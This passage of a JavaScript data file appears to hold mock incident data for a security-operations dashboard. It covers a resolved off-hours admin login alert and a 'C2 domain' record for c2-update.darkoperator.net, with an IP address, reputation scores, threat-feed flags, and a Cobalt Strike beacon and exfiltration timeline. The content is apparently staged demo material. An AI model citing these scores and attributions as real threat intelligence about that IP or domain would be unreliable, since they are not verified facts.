            viewOnGraph: { nodeId:'alert-admin-offhours', label:'Admin Off-Hours Login', icon:'🔔', sourceEntity:'user-admin' },
            alertProfileId: 'alert-admin-offhours',
            detailsGrid: [
              { label:'21:15:00 Admin Login Outside Business Hours', value:'Policy Violation', tag:'Type', tagVal:'UEBA', mitre:'T1078 (Valid Accounts)', source:'DC-01', status:'Resolved', severity:'Medium' }
            ] }
        ]
      },
      remediationGuide: {
        label: 'Recommendations & Remediation', expanded: true, noCollapse: true,
        remediationData: {
          verdict: 'Resolved — Off-Hours Admin Activity Explained',
          severity: 'low',
          recommendations: [
            { icon:'✅', title:'No Action Required', desc:'Admin login at 21:15 was confirmed as emergency maintenance by the admin. MFA was verified via hardware token. All actions were within authorized scope.', priority:'Info' },
            { icon:'📊', title:'Update Off-Hours Policy', desc:'Consider adding a pre-approved maintenance window or break-glass procedure to avoid future false positive alerts for legitimate admin work.', priority:'Low' },
            { icon:'🛡', title:'Review PAM Configuration', desc:'Ensure Privileged Access Management (PAM) is configured for just-in-time admin access. Current global admin privileges are always-on.', priority:'Medium' }
          ],
          playbooks: [
            { name:'Admin Account Review', id:'PB-ADMIN-001', desc:'Verify admin activity scope → Check MFA logs → Review privileged role usage → Generate audit report', status:'Ready', estimatedTime:'3 min', urgency:'High Priority' }
          ]
        }
      }
    }
  },
  'domain-c2': {
    type: 'domain', modalTitle: 'Domain Details · c2-update.darkoperator.net',
    sections: {
      riskSummary: {
        label: 'Risk Summary', expanded: true, noCollapse: true,
        summaryCard: {
          riskScore: 98,
          maxScore: 100,
          severity: 'Critical',
          statusBadge: 'C2 Infrastructure',
          metrics: [
            { icon:'☠', label:'Threat Feeds Flagged', value:'5', color:'#DD1616' },
            { icon:'📤', label:'Data Exfiltrated', value:'4.2 MB', color:'#FF5900' },
            { icon:'🔍', label:'VirusTotal Detections', value:'18/94', color:'#DD1616' }
          ],
          firstSeen: '2025-11-22',
          lastActivity: '11 May 2026 10:35:44'
        }
      },
      ipDetails: {
        label: 'Domain & IP Details', expanded: true,
        kv: {
          'Domain':'c2-update.darkoperator.net',
          'Resolved IP':'185.220.101.99',
          'Registrar':'Njalla (Privacy-Protected)',
          'First Seen':'2025-11-22',
          'ASN':'AS9009 — M247 Ltd (Romania)',
          'Hosting':'Bulletproof hosting — known for malware infrastructure',
          'VirusTotal':'18/94 vendors flagged as malicious',
          'AbuseIPDB':'Confidence 98% — 142 reports',
          'Threat Feeds':'Flagged by AlienVault, Emerging Threats, Abuse.ch, FeodoTracker, ThreatFox'
        }
      },
      threatIntelligence: {
        label: 'Threat Intelligence', expanded: true, viewAll: true,
        timeline: [
          { time:'11 May 2026  10:35:44', dot:'red', malicious: true,
            details: { 'Type':'DNS Resolution', 'Domain':'c2-update.darkoperator.net', 'IP':'185.220.101.99', 'Source':'CORP-WS-045', 'Process':'powershell.exe (PID 4892)' } },
          { time:'11 May 2026  10:34:12', dot:'red', malicious: true,
            details: { 'Type':'TLS Connection', 'Destination':'185.220.101.99:443', 'Bytes Out':'4.2 MB', 'Bytes In':'128 KB', 'Duration':'2m 18s', 'Protocol':'TLS 1.2' } },
          { time:'11 May 2026  10:30:05', dot:'red', malicious: true,
            details: { 'Type':'Cobalt Strike Beacon', 'Interval':'60s', 'Jitter':'15%', 'C2 Profile':'jQuery Malleable', 'User-Agent':'Mozilla/5.0' } }
        ]
      },
      connectionHistory: {
        label: 'Connection History', expanded: false, viewAll: true,
        timeline: [
          { time:'11 May 2026  10:35:44', dot:'red', malicious: true,
            details: { 'Source':'CORP-WS-045 (10.18.99.14)', 'Destination':'185.220.101.99:443', 'Protocol':'TLS 1.2', 'Bytes':'4.2 MB out / 128 KB in' } },
          { time:'11 May 2026  10:30:05', dot:'red', malicious: true,
            details: { 'Source':'CORP-WS-045 (10.18.99.14)', 'Destination':'185.220.101.99:443', 'Protocol':'HTTPS', 'Bytes':'2.1 KB out / 512 B in' } }
        ]
      }
    }
  },
};

/* ── INVESTIGATION GRAPH FUNCTIONS ───────────────────────────── */

